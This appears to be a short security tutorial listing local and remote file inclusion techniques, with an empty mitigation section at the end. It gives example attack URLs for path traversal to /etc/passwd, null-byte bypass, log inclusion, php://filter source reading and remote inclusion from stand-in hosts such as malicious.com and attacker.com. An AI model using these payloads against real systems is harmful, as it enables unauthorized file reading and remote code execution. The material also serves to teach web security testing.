# File inclusion

File inclusion is a web vulnerability allowing attackers to include files on a server through a web application, potentially leading to unauthorized access, data exposure, or code execution.

## METHODS TO PEFORM FILE INCLUSION

## 1.Advanced Techniques for LFI
- ###Directory Traversal

Attackers can use directory traversal sequences (e.g., ../) to navigate the file system and include files outside the intended directory.
Example:
```text
http://example.com/page.php?file=../../etc/passwd
```
- ### Null Byte Injection

In some cases, attackers can exploit null byte (%00) injection to terminate strings in file paths, allowing them to bypass file extension checks.
Example:
```text
http://example.com/page.php?file=somefile.php%00.jpg
```
- ### Log File Inclusion

Attackers can include log files that contain user input, potentially leading to code execution if the input is malicious.
Example:
```text
http://example.com/page.php?file=/var/log/apache2/access.log
```
- ### PHP Wrapper Exploitation

Attackers can use PHP wrappers (e.g., php://filter, php://input) to read files or execute code.
Example:
```text
http://example.com/page.php?file=php://filter/convert.base64-encode/resource=index.php
```
- ### File Inclusion via Session Variables

If the application uses session variables to determine file paths, attackers can manipulate these variables to include arbitrary files.
Example:
```text
// Set session variable to include a sensitive file
$_SESSION['file'] = '../../etc/passwd';
```
## 2.Advanced Techniques for RFI
- ### Remote File Inclusion

Attackers can include files from remote servers if the application does not validate the source of the file.
Example:
```text
http://example.com/page.php?file=http://malicious.com/malicious.php
```
- ### Using Local Files as a Proxy

Attackers can host a malicious file on their server and trick the application into including it by using a local file as a proxy.
Example:
```text
http://example.com/page.php?file=http://localhost/malicious.php
```
- ### Exploiting Misconfigured Servers

If a server is misconfigured to allow file uploads, attackers can upload a malicious file and then include it.
Example:
```text
// Upload a file named malicious.php
http://example.com/upload.php?file=malicious.php
```
- ### Using Protocols

Attackers can exploit different protocols (e.g., FTP, HTTP) to include files from remote locations.
Example:
```text
http://example.com/page.php?file=ftp://attacker.com/malicious.txt
```
- ### DNS Rebinding

Attackers can use DNS rebinding to trick the application into including files from a malicious server that appears to be a trusted domain.
Example:

An attacker sets up a domain that resolves to their server and then uses it in the RFI payload.

## MITIGATION FOR FILE INCLUSION



